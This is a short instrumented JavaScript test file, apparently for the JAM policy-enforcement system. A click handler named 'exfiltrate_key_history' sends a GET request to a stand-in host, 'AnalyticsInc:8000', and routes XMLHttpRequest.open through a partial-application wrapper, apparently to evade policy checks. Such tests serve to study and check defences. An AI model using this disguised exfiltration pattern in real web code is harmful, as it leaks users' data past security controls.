
JAM.startProfile('load');
function exfiltrate_key_history() {
  function partial(func$$3) {
    function v0() {
      var v8 = Array.prototype;
      var v5 = v8.slice;
      introspect(JAM.policy.p13) {
        var v1 = v5.call(arguments)
      }
      introspect(JAM.policy.p24) {
        var allArguments = args.concat(v1)
      }
      introspect(JAM.policy.p23) {
        return func$$3.apply(this, allArguments)
      }
    }
    var v6 = Array.prototype;
    var v2 = v6.slice;
    introspect(JAM.policy.p13) {
      var args = v2.call(arguments, 1)
    }
    return v0
  }
  xmlhttp = new XMLHttpRequest;
  var v3 = xmlhttp;
  var v7 = xmlhttp.open;
  var v9 = partial(v7, "GET", "http://AnalyticsInc:8000/submission.html?test=partial", true);
  v3.openn = v9;
  introspect(JAM.policy.p13) {
    xmlhttp.openn()
  }
  introspect(JAM.policy.p13) {
    xmlhttp.send(null)
  }
  return
}
introspect(JAM.policy.p14) {
  var v4 = document.getElementById("test")
}
v4.onclick = exfiltrate_key_history;

JAM.stopProfile('load');
